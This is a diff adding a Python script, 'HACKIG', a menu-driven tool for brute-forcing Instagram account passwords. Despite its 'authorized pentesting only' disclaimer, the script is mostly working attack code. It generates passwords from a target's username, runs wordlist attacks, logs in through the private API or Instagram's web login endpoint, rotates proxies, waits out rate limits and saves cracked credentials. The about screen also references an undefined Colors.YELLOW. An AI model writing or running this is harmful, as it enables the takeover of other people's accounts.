@@ -1,0 +1,835 @@
+#!/usr/bin/env python3
+"""
+HACKIG - Instagram Password Testing Tool (Authorized Pentesting Only)
+Version: 2.0
+Compatible with: Termux, Linux, macOS
+
+DISCLAIMER: Use only on accounts you own or have explicit written permission to test.
+"""
+
+import os
+import sys
+import json
+import time
+import random
+import string
+import threading
+import queue
+from datetime import datetime
+
+# ============ TRY INSTAGRAM PRIVATE API ============
+try:
+    from instagram_private_api import (
+        Client, ClientError, ClientLoginError, ClientLoginRequiredError,
+        ClientCookieExpiredError, ClientThrottledError
+    )
+    HAS_PRIVATE_API = True
+except ImportError:
+    HAS_PRIVATE_API = False
+
+try:
+    import requests
+except ImportError:
+    print("[!] requests not installed. Run: pip install requests")
+    sys.exit(1)
+
+# ========================================================
+#                        CONFIG
+# ========================================================
+APP_NAME = "hackig"
+APP_VERSION = "2.0"
+AUTHOR = "Pentest Tool"
+GITHUB_REPO = "https://github.com/yourusername/hackig"
+
+# Color codes for Termux
+class Colors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    CYAN = '\033[96m'
+    GREEN = '\033[92m'
+    WARNING = '\033[93m'
+    RED = '\033[91m'
+    WHITE = '\033[97m'
+    BOLD = '\033[1m'
+    DIM = '\033[2m'
+    END = '\033[0m'
+    CLEAR = '\033[2J\033[H'
+
+# ========================================================
+#                      PASSWORD GENERATORS
+# ========================================================
+
+class PasswordGenerator:
+    """Generates smart password combinations from a base username/keywords."""
+
+    COMMON_PASSWORDS = [
+        "123456", "password", "123456789", "12345678", "12345",
+        "1234567890", "qwerty123", "iloveyou", "monkey", "dragon",
+        "abc123", "password1", "qwertyuiop", "letmein", "welcome",
+        "admin123", "111111", "000000", "sunshine", "trustno1",
+    ]
+
+    COMMON_SUFFIXES = [
+        "", "123", "1234", "12345", "123456", "1", "!",
+        "@", "#", "2024", "2025", "2026", "!", "!!",
+    ]
+
+    COMMON_PREFIXES = [
+        "", "!", "@", "#", "$",
+    ]
+
+    @staticmethod
+    def from_username(username):
+        """Generate password candidates based on username."""
+        candidates = set()
+
+        # Username variations
+        candidates.add(username.lower())
+        candidates.add(username.upper())
+        candidates.add(username.capitalize())
+
+        # Username + suffixes
+        for suffix in PasswordGenerator.COMMON_SUFFIXES:
+            candidates.add(f"{username.lower()}{suffix}")
+            candidates.add(f"{username.capitalize()}{suffix}")
+
+        # Prefix + username
+        for prefix in PasswordGenerator.COMMON_PREFIXES:
+            candidates.add(f"{prefix}{username.lower()}")
+
+        # Leet speak variations
+        leet = {
+            'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'],
+            'o': ['0'], 's': ['5', '$'], 't': ['7']
+        }
+        for i, char in enumerate(username.lower()):
+            if char in leet:
+                for replacement in leet[char]:
+                    leet_variant = username.lower()[:i] + replacement + username.lower()[i+1:]
+                    candidates.add(leet_variant)
+                    for suffix in PasswordGenerator.COMMON_SUFFIXES[:5]:
+                        candidates.add(f"{leet_variant}{suffix}")
+
+        # Common passwords variation
+        for common in PasswordGenerator.COMMON_PASSWORDS:
+            candidates.add(common)
+
+        return list(candidates)
+
+    @staticmethod
+    def from_keywords(keywords):
+        """Generate passwords from a list of keywords."""
+        candidates = set()
+        for kw in keywords:
+            kw = kw.strip().lower()
+            if not kw:
+                continue
+            for suffix in PasswordGenerator.COMMON_SUFFIXES:
+                candidates.add(f"{kw}{suffix}")
+            for prefix in PasswordGenerator.COMMON_PREFIXES:
+                candidates.add(f"{prefix}{kw}")
+        return list(candidates)
+
+    @staticmethod
+    def from_wordlist(filepath):
+        """Load passwords from a wordlist file."""
+        if not os.path.exists(filepath):
+            return []
+        with open(filepath, 'r', encoding='latin-1', errors='ignore') as f:
+            return [line.strip() for line in f if line.strip()]
+
+
+# ========================================================
+#                     INSTAGRAM ENGINE
+# ========================================================
+
+class InstagramEngine:
+    """Handles Instagram authentication attempts via private API."""
+
+    def __init__(self, proxy_list=None, user_agent=None):
+        self.proxy_list = proxy_list or []
+        self.proxy_index = 0
+        self.user_agent = user_agent or (
+            "Instagram 276.0.0.21.103 Android (30/11; 420dpi; 1080x1920; "
+            "Samsung; SM-G991B; p3s; exynos2100; en_US; 539429394)"
+        )
+        self.lock = threading.Lock()
+        self.attempt_count = 0
+        self.start_time = None
+
+    def _get_proxy(self):
+        """Get next proxy from pool (round-robin)."""
+        if not self.proxy_list:
+            return None
+        with self.lock:
+            proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
+            self.proxy_index += 1
+            return proxy
+
+    def test_login(self, username, password):
+        """Attempt login with a single password. Returns (success, message)."""
+        self.attempt_count += 1
+
+        proxy = self._get_proxy()
+        proxy_dict = None
+        if proxy:
+            proxy_dict = {'http': proxy, 'https': proxy}
+
+        # Settings dict for the API client
+        settings = {
+            'user_agent': self.user_agent,
+        }
+        if proxy_dict:
+            settings['proxy'] = proxy_dict
+
+        if HAS_PRIVATE_API:
+            try:
+                client = Client(
+                    username,
+                    password,
+                    on_login=lambda x: None,
+                    settings=settings,
+                )
+                # If we reach here, login succeeded
+                return True, f"LOGIN SUCCESSFUL: {username}:{password}"
+
+            except ClientLoginError as e:
+                # Wrong password
+                error_msg = str(e)
+                if "challenge_required" in error_msg:
+                    return False, "CHALLENGE_REQUIRED"
+                elif "Please wait" in error_msg:
+                    return False, "RATE_LIMITED"
+                elif "checkpoint_required" in error_msg:
+                    return False, "CHECKPOINT_REQUIRED"
+                elif "bad_password" in error_msg or "incorrect" in error_msg.lower():
+                    return False, "WRONG_PASSWORD"
+                else:
+                    return False, f"LOGIN_FAILED: {error_msg[:50]}"
+
+            except ClientThrottledError:
+                return False, "THROTTLED"
+
+            except ClientCookieExpiredError:
+                return False, "COOKIE_EXPIRED"
+
+            except ClientError as e:
+                return False, f"CLIENT_ERROR: {str(e)[:50]}"
+
+            except Exception as e:
+                return False, f"ERROR: {str(e)[:50]}"
+        else:
+            # Fallback: Use direct requests to simulate
+            return self._test_login_requests(username, password, proxy_dict)
+
+    def _test_login_requests(self, username, password, proxy_dict):
+        """Fallback login attempt using direct HTTP requests."""
+        session = requests.Session()
+        session.headers.update({
+            'User-Agent': self.user_agent,
+            'Accept': '*/*',
+            'Accept-Language': 'en-US',
+            'X-IG-App-ID': '936619743392459',
+        })
+
+        try:
+            # Step 1: Get CSRF token
+            resp = session.get(
+                'https://www.instagram.com/web/__mid/',
+                proxies=proxy_dict,
+                timeout=15
+            )
+
+            # Step 2: Attempt login
+            time_now = int(datetime.now().timestamp())
+            data = {
+                'username': username,
+                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}',
+                'queryParams': '{}',
+                'optIntoOneTap': 'false',
+                'stopDeletionNonce': '',
+                'trustedDeviceRecords': '{}',
+            }
+
+            login_resp = session.post(
+                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
+                data=data,
+                proxies=proxy_dict,
+                timeout=15,
+            )
+
+            result = login_resp.json()
+
+            if result.get('authenticated'):
+                return True, f"LOGIN SUCCESSFUL: {username}:{password}"
+            elif result.get('user', False) and not result.get('authenticated'):
+                return False, "WRONG_PASSWORD"
+            elif 'checkpoint_url' in result:
+                return False, "CHECKPOINT_REQUIRED"
+            elif 'errors' in result:
+                return False, f"ERROR: {result['errors']}"
+            else:
+                return False, f"UNKNOWN: {str(result)[:60]}"
+
+        except requests.exceptions.ProxyError:
+            return False, "PROXY_ERROR"
+        except requests.exceptions.Timeout:
+            return False, "TIMEOUT"
+        except requests.exceptions.ConnectionError:
+            return False, "CONNECTION_ERROR"
+        except Exception as e:
+            return False, f"REQ_ERROR: {str(e)[:50]}"
+
+    def get_stats(self):
+        """Get current attempt statistics."""
+        elapsed = 0
+        if self.start_time:
+            elapsed = time.time() - self.start_time
+        rate = 0
+        if elapsed > 0:
+            rate = self.attempt_count / elapsed
+        return {
+            'attempts': self.attempt_count,
+            'elapsed': elapsed,
+            'rate': rate,
+        }
+
+
+# ========================================================
+#                    TERMINAL UI
+# ========================================================
+
+class TermUI:
+    """Terminal user interface for Termux."""
+
+    def __init__(self):
+        self.width = 60
+
+    def clear(self):
+        """Clear the terminal."""
+        print(Colors.CLEAR, end='')
+
+    def print_banner(self):
+        """Display the main banner."""
+        banner = f"""
+{Colors.RED}{Colors.BOLD}
+    ╔═══════════════════════════════════════════════╗
+    ║                                               ║
+    ║       {Colors.WHITE}██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗ ██████╗ {Colors.RED}║
+    ║       {Colors.WHITE}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝ {Colors.RED}║
+    ║       {Colors.WHITE}███████║███████║██║     █████╔╝ ██║██║  ███╗{Colors.RED}║
+    ║       {Colors.WHITE}██╔══██║██╔══██║██║     ██╔═██╗ ██║██║   ██║{Colors.RED}║
+    ║       {Colors.WHITE}██║  ██║██║  ██║╚██████╗██║  ██╗██║╚██████╔╝{Colors.RED}║
+    ║       {Colors.WHITE}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝ ╚═════╝ {Colors.RED}║
+    ║                                               ║
+    ║  {Colors.CYAN}Instagram Password Testing Tool  v{APP_VERSION}{Colors.RED}      ║
+    ║  {Colors.DIM}Authorized Pentesting Only{Colors.RED}                   ║
+    ╚═══════════════════════════════════════════════╝
+{Colors.END}"""
+        print(banner)
+
+    def print_menu(self):
+        """Display the main menu."""
+        menu = f"""
+{Colors.CYAN}{Colors.BOLD}  ┌─────────────── MAIN MENU ───────────────┐{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.GREEN}[1]{Colors.END}  Auto Attack (Smart Mode)           {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.GREEN}[2]{Colors.END}  Auto Attack (Wordlist Mode)         {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.GREEN}[3]{Colors.END}  Generate Password List from Username {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.GREEN}[4]{Colors.END}  View / Edit Config                  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.GREEN}[5]{Colors.END}  About & Help                        {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.RED}[0]{Colors.END}  Exit                                 {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  └──────────────────────────────────────────┘{Colors.END}
+"""
+        print(menu)
+
+    def get_input(self, prompt, default=None):
+        """Get user input with styled prompt."""
+        styled_prompt = f"{Colors.BOLD}{Colors.GREEN}>>{Colors.END} {Colors.CYAN}{prompt}{Colors.END}: "
+        if default:
+            styled_prompt += f" [{default}] "
+        value = input(styled_prompt).strip()
+        return value if value else default
+
+    def print_status(self, message, color=Colors.WHITE):
+        """Print a status message."""
+        print(f"{Colors.DIM}[{Colors.END}{Colors.GREEN}*{Colors.END}{Colors.DIM}]{Colors.END} {color}{message}{Colors.END}")
+
+    def print_error(self, message):
+        """Print an error message."""
+        print(f"{Colors.RED}[!] {message}{Colors.END}")
+
+    def print_success(self, message):
+        """Print a success message."""
+        print(f"{Colors.GREEN}[+] {message}{Colors.END}")
+
+    def print_warning(self, message):
+        """Print a warning message."""
+        print(f"{Colors.WARNING}[!] {message}{Colors.END}")
+
+    def progress_bar(self, current, total, width=40):
+        """Display a progress bar."""
+        if total == 0:
+            return
+        percent = current / total
+        filled = int(width * percent)
+        bar = '█' * filled + '░' * (width - filled)
+        print(f"\r  [{Colors.GREEN}{bar}{Colors.END}] {current}/{total} ({percent*100:.1f}%)", end='', flush=True)
+
+    def live_stats(self, engine, total):
+        """Display live attack statistics."""
+        stats = engine.get_stats()
+        elapsed = stats['elapsed']
+        rate = stats['rate']
+        elapsed_str = f"{int(elapsed // 60)}m {int(elapsed % 60)}s" if elapsed > 0 else "0s"
+
+        status_lines = f"""
+{Colors.CYAN}  ┌─────────────── ATTACK STATUS ───────────────┐{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Attempts:    {Colors.WHITE}{stats['attempts']:<10}{Colors.END}              {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Passwords:   {Colors.WHITE}{total:<10}{Colors.END}              {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Speed:       {Colors.WHITE}{rate:.1f} pass/sec{Colors.END}              {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Elapsed:     {Colors.WHITE}{elapsed_str:<10}{Colors.END}              {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  └──────────────────────────────────────────────┘{Colors.END}
+"""
+        print(status_lines)
+
+
+# ========================================================
+#                   ATTACK ENGINE
+# ========================================================
+
+class AttackEngine:
+    """Manages the attack process."""
+
+    def __init__(self, ui, engine):
+        self.ui = ui
+        self.engine = engine
+        self.running = False
+        self.stop_event = threading.Event()
+        self.found_password = None
+
+    def auto_attack_smart(self, username):
+        """Smart mode: generates passwords from username and tests them."""
+        self.ui.clear()
+        self.ui.print_banner()
+
+        self.ui.print_status(f"Target: {username}", Colors.CYAN)
+        self.ui.print_status("Generating smart password combinations...", Colors.WARNING)
+
+        # Generate password candidates
+        passwords = PasswordGenerator.from_username(username)
+
+        # Add some common extra passwords
+        passwords.extend([
+            f"{username}{year}" for year in ["1990","1991","1992","1993","1994","1995",
+                                              "1996","1997","1998","1999","2000","2001",
+                                              "2002","2003","2004","2005"]
+        ])
+
+        # Remove duplicates while preserving order
+        seen = set()
+        passwords_unique = []
+        for p in passwords:
+            if p not in seen:
+                seen.add(p)
+                passwords_unique.append(p)
+
+        total = len(passwords_unique)
+        self.ui.print_success(f"Generated {total} smart password candidates")
+
+        input(f"{Colors.DIM}Press Enter to start attack...{Colors.END}")
+        self._run_attack(username, passwords_unique)
+
+    def auto_attack_wordlist(self, username, wordlist_path):
+        """Wordlist mode: tests passwords from a file."""
+        self.ui.clear()
+        self.ui.print_banner()
+
+        self.ui.print_status(f"Target: {username}", Colors.CYAN)
+        self.ui.print_status(f"Wordlist: {wordlist_path}", Colors.CYAN)
+
+        if not os.path.exists(wordlist_path):
+            self.ui.print_error(f"Wordlist not found: {wordlist_path}")
+            return
+
+        passwords = PasswordGenerator.from_wordlist(wordlist_path)
+        total = len(passwords)
+        self.ui.print_success(f"Loaded {total} passwords from wordlist")
+
+        input(f"{Colors.DIM}Press Enter to start attack...{Colors.END}")
+        self._run_attack(username, passwords)
+
+    def _run_attack(self, username, passwords):
+        """Core attack loop."""
+        self.running = True
+        self.stop_event.clear()
+        self.engine.start_time = time.time()
+        total = len(passwords)
+
+        # Proxy config
+        print()
+        use_proxies = self.ui.get_input("Use proxies? (y/n)", "n").lower() == 'y'
+        proxies = []
+        if use_proxies:
+            proxy_file = self.ui.get_input("Proxy file path", "proxies.txt")
+            if os.path.exists(proxy_file):
+                with open(proxy_file) as f:
+                    proxies = [line.strip() for line in f if line.strip()]
+                self.ui.print_success(f"Loaded {len(proxies)} proxies")
+            else:
+                self.ui.print_warning("Proxy file not found. Running without proxies.")
+
+        delay = float(self.ui.get_input("Delay between attempts (seconds)", "0.5"))
+
+        self.ui.clear()
+        self.ui.print_banner()
+
+        # Display target info
+        print(f"""
+{Colors.CYAN}  ┌───────────────── TARGET INFO ─────────────────┐{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                              {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Username:     {Colors.WHITE}{username:<30}{Colors.END}  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Passwords:    {Colors.WHITE}{total:<30}{Colors.END}  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Delay:        {Colors.WHITE}{delay:<30}{Colors.END}  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Proxies:      {Colors.WHITE}{len(proxies):<30}{Colors.END}  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                              {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  └──────────────────────────────────────────────────┘{Colors.END}
+
+{Colors.WARNING}  [!] Press Ctrl+C at any time to stop.{Colors.END}
+""")
+
+        time.sleep(1)
+
+        # Main attempt loop
+        try:
+            for i, password in enumerate(passwords, 1):
+                if self.stop_event.is_set():
+                    break
+
+                # Display progress
+                percent = (i / total) * 100
+                elapsed = time.time() - self.engine.start_time
+                rate = i / elapsed if elapsed > 0 else 0
+                eta = (total - i) / rate if rate > 0 else 0
+                eta_str = f"{int(eta//60)}m {int(eta%60)}s" if eta > 0 else "0s"
+
+                # Print attempt line
+                masked_pass = password[:4] + '*' * min(len(password)-4, 4) if len(password) > 4 else '****'
+                sys.stdout.write(
+                    f"\r{Colors.DIM}[{Colors.END}{Colors.GREEN}{i:>6}/{total}{Colors.END}{Colors.DIM}]{Colors.END} "
+                    f"{Colors.CYAN}[{percent:5.1f}%]{Colors.END} "
+                    f"{Colors.WHITE}Testing: {masked_pass:<12}{Colors.END} "
+                    f"{Colors.DIM}| {rate:.1f}/s | ETA: {eta_str}{Colors.END}   "
+                )
+                sys.stdout.flush()
+
+                # Attempt login
+                success, message = self.engine.test_login(username, password)
+
+                if "SUCCESSFUL" in message:
+                    print("\n")
+                    self.ui.print_success("=" * 50)
+                    self.ui.print_success(message)
+                    self.ui.print_success("=" * 50)
+                    self.found_password = password
+                    # Save to file
+                    self._save_result(username, password)
+                    break
+
+                elif "CHALLENGE" in message or "CHECKPOINT" in message:
+                    print(f"\n{Colors.WARNING}[!] {message} - Instagram wants verification{Colors.END}")
+                    cont = self.ui.get_input("Continue? (y/n)", "y").lower() == 'y'
+                    if not cont:
+                        break
+
+                elif "RATE_LIMITED" in message or "THROTTLED" in message:
+                    print(f"\n{Colors.WARNING}[!] Rate limited. Waiting 60 seconds...{Colors.END}")
+                    time.sleep(60)
+
+                elif "PROXY_ERROR" in message and proxies:
+                    # Try next proxy
+                    continue
+
+                # Delay between attempts
+                time.sleep(delay)
+
+        except KeyboardInterrupt:
+            print(f"\n\n{Colors.WARNING}[!] Attack stopped by user.{Colors.END}")
+
+        # Final stats
+        elapsed = time.time() - self.engine.start_time
+        print(f"\n\n{Colors.CYAN}{'='*50}{Colors.END}")
+        print(f"{Colors.BOLD}Attack Complete{Colors.END}")
+        print(f"  Total attempts: {self.engine.attempt_count}")
+        print(f"  Time elapsed:   {int(elapsed//60)}m {int(elapsed%60)}s")
+        print(f"  Average rate:   {self.engine.attempt_count/elapsed:.1f}/s" if elapsed > 0 else "")
+        if self.found_password:
+            print(f"  {Colors.GREEN}Password found: {self.found_password}{Colors.END}")
+        else:
+            print(f"  {Colors.RED}Password not found in this list{Colors.END}")
+        print(f"{Colors.CYAN}{'='*50}{Colors.END}")
+
+        self.running = False
+
+        input(f"\n{Colors.DIM}Press Enter to return to menu...{Colors.END}")
+
+    def _save_result(self, username, password):
+        """Save found credentials to file."""
+        result_file = f"{APP_NAME}_results.txt"
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(result_file, "a") as f:
+            f.write(f"[{timestamp}] {username}:{password}\n")
+        self.ui.print_success(f"Result saved to {result_file}")
+
+
+# ========================================================
+#                   MAIN APPLICATION
+# ========================================================
+
+class HackigApp:
+    """Main application controller."""
+
+    def __init__(self):
+        self.ui = TermUI()
+        self.engine = InstagramEngine()
+        self.attack = AttackEngine(self.ui, self.engine)
+        self.config = {
+            'default_wordlist': 'passwords.txt',
+            'delay': 0.5,
+            'proxy_file': 'proxies.txt',
+        }
+
+    def check_dependencies(self):
+        """Check and install dependencies."""
+        if not HAS_PRIVATE_API:
+            self.ui.print_warning("Instagram Private API not installed.")
+            install = self.ui.get_input("Install it now? (y/n)", "y").lower() == 'y'
+            if install:
+                self.ui.print_status("Installing instagram-private-api...")
+                os.system("pip install instagram-private-api 2>/dev/null || pip3 install instagram-private-api 2>/dev/null")
+                self.ui.print_status("Installation attempted. Restart the tool.")
+                sys.exit(0)
+            else:
+                self.ui.print_warning("Falling back to HTTP request method (less reliable)")
+
+    def run(self):
+        """Main application loop."""
+        # Clear screen and show banner
+        self.ui.clear()
+        self.ui.print_banner()
+
+        # Check if first run
+        if not os.path.exists(f"{APP_NAME}_config.json"):
+            self.ui.print_status("First run detected. Checking dependencies...")
+            self.check_dependencies()
+            time.sleep(1)
+
+        # Check for results file
+        if os.path.exists(f"{APP_NAME}_results.txt"):
+            self.ui.print_status(f"Previous results found in {APP_NAME}_results.txt")
+
+        while True:
+            self.ui.clear()
+            self.ui.print_banner()
+            self.ui.print_menu()
+
+            choice = self.ui.get_input("Select option")
+
+            if choice == "1":
+                self.mode_auto_attack_smart()
+            elif choice == "2":
+                self.mode_auto_attack_wordlist()
+            elif choice == "3":
+                self.mode_generate_list()
+            elif choice == "4":
+                self.mode_config()
+            elif choice == "5":
+                self.mode_about()
+            elif choice == "0" or choice.lower() == "exit":
+                self.ui.print_status("Exiting. Stay ethical.")
+                break
+            else:
+                self.ui.print_error("Invalid option.")
+                time.sleep(1)
+
+    def mode_auto_attack_smart(self):
+        """Smart attack mode handler."""
+        self.ui.clear()
+        self.ui.print_banner()
+
+        print(f"""
+{Colors.CYAN}  ┌──────────── AUTO ATTACK: SMART MODE ──────────┐{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  This mode generates password candidates     {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  based on the username, common patterns,     {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  leet speak, and year combinations.          {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.WARNING}Best for personal accounts where the{Colors.END}        {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.WARNING}password might relate to the username.{Colors.END}     {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  └──────────────────────────────────────────────┘{Colors.END}
+""")
+
+        username = self.ui.get_input("Enter Instagram username to test")
+        if not username:
+            self.ui.print_error("Username cannot be empty")
+            time.sleep(1)
+            return
+
+        self.attack.auto_attack_smart(username)
+
+    def mode_auto_attack_wordlist(self):
+        """Wordlist attack mode handler."""
+        self.ui.clear()
+        self.ui.print_banner()
+
+        print(f"""
+{Colors.CYAN}  ┌─────────── AUTO ATTACK: WORDLIST MODE ─────────┐{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  This mode uses a wordlist file containing   {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  one password per line.                      {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Popular wordlists: rockyou.txt, common.txt  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.WARNING}More thorough but slower.{Colors.END}               {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  └──────────────────────────────────────────────┘{Colors.END}
+""")
+
+        username = self.ui.get_input("Enter Instagram username to test")
+        if not username:
+            self.ui.print_error("Username cannot be empty")
+            time.sleep(1)
+            return
+
+        wordlist = self.ui.get_input(
+            "Path to wordlist file",
+            self.config['default_wordlist']
+        )
+
+        self.attack.auto_attack_wordlist(username, wordlist)
+
+    def mode_generate_list(self):
+        """Generate password list handler."""
+        self.ui.clear()
+        self.ui.print_banner()
+
+        print(f"""
+{Colors.CYAN}  ┌────────── GENERATE PASSWORD LIST ────────────┐{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Creates a custom password list based on     {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  a username or keywords.                     {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  └──────────────────────────────────────────────┘{Colors.END}
+""")
+
+        username = self.ui.get_input("Enter username as base")
+        if not username:
+            self.ui.print_error("Username cannot be empty")
+            time.sleep(1)
+            return
+
+        passwords = PasswordGenerator.from_username(username)
+
+        output_file = self.ui.get_input("Output filename", f"{username}_passwords.txt")
+
+        with open(output_file, 'w') as f:
+            for p in passwords:
+                f.write(p + '\n')
+
+        self.ui.print_success(f"Generated {len(passwords)} passwords -> {output_file}")
+        input(f"\n{Colors.DIM}Press Enter to continue...{Colors.END}")
+
+    def mode_config(self):
+        """Configuration handler."""
+        self.ui.clear()
+        self.ui.print_banner()
+
+        print(f"""
+{Colors.CYAN}  ┌────────────────── CONFIG ────────────────────┐{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  Current Configuration:                    {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}    Default Wordlist: {self.config['default_wordlist']:<20}{Colors.END}  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}    Delay:            {self.config['delay']:<20}{Colors.END}  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}    Proxy File:       {self.config['proxy_file']:<20}{Colors.END}  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  └──────────────────────────────────────────────┘{Colors.END}
+""")
+
+        wordlist = self.ui.get_input("Default wordlist path", self.config['default_wordlist'])
+        delay = self.ui.get_input("Delay between attempts (seconds)", str(self.config['delay']))
+        proxy_file = self.ui.get_input("Proxy file path", self.config['proxy_file'])
+
+        self.config['default_wordlist'] = wordlist
+        self.config['delay'] = float(delay)
+        self.config['proxy_file'] = proxy_file
+
+        # Save config
+        with open(f"{APP_NAME}_config.json", 'w') as f:
+            json.dump(self.config, f, indent=2)
+
+        self.ui.print_success("Configuration saved.")
+        input(f"\n{Colors.DIM}Press Enter to continue...{Colors.END}")
+
+    def mode_about(self):
+        """About screen."""
+        self.ui.clear()
+        self.ui.print_banner()
+
+        print(f"""
+{Colors.CYAN}{Colors.BOLD}  {APP_NAME.upper()} v{APP_VERSION}{Colors.END}
+{Colors.DIM}  Instagram Password Testing Tool{Colors.END}
+
+{Colors.WHITE}  Author:   {AUTHOR}{Colors.END}
+{Colors.WHITE}  GitHub:   {GITHUB_REPO}{Colors.END}
+
+{Colors.CYAN}  ┌─────────────── DISCLAIMER ─────────────────┐{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.RED}This tool is for AUTHORIZED PENTESTING ONLY.{Colors.END}  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.RED}Using it on accounts you don't own or have{Colors.END}    {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.RED}written permission to test is ILLEGAL.{Colors.END}        {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.YELLOW}Instagram has aggressive rate limiting.{Colors.END}       {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}  {Colors.YELLOW}Expect challenges, checkpoints, and blocks.{Colors.END}  {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  │{Colors.END}                                            {Colors.CYAN}│{Colors.END}
+{Colors.CYAN}  └──────────────────────────────────────────────┘{Colors.END}
+
+{Colors.CYAN}  Features:{Colors.END}
+  {Colors.GREEN}•{Colors.END} Smart password generation from username
+  {Colors.GREEN}•{Colors.END} Wordlist-based brute force
+  {Colors.GREEN}•{Colors.END} Proxy rotation support
+  {Colors.GREEN}•{Colors.END} Live statistics and progress tracking
+  {Colors.GREEN}•{Colors.END} Instagram Private API integration
+  {Colors.GREEN}•{Colors.END} Customizable attack parameters
+
+{Colors.CYAN}  Dependencies:{Colors.END}
+  {Colors.DIM}•{Colors.END} instagram-private-api (pip)
+  {Colors.DIM}•{Colors.END} requests (pip)
+  {Colors.DIM}•{Colors.END} Python 3.6+
+
+{Colors.CYAN}  Installation:{Colors.END}
+  {Colors.DIM}${Colors.END} pkg install python git
+  {Colors.DIM}${Colors.END} pip install instagram-private-api requests
+  {Colors.DIM}${Colors.END} git clone {GITHUB_REPO}
+  {Colors.DIM}${Colors.END} cd {APP_NAME}
+  {Colors.DIM}${Colors.END} python {APP_NAME}.py
+""")
+
+        input(f"{Colors.DIM}Press Enter to return to menu...{Colors.END}")
+
+
+# ========================================================
+#                     ENTRY POINT
+# ========================================================
+
+if __name__ == "__main__":
+    try:
+        app = HackigApp()
+        app.run()
+    except KeyboardInterrupt:
+        print(f"\n\n{Colors.RED}[!] Exiting...{Colors.END}")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n{Colors.RED}[!] Fatal error: {e}{Colors.END}")
+        sys.exit(1)
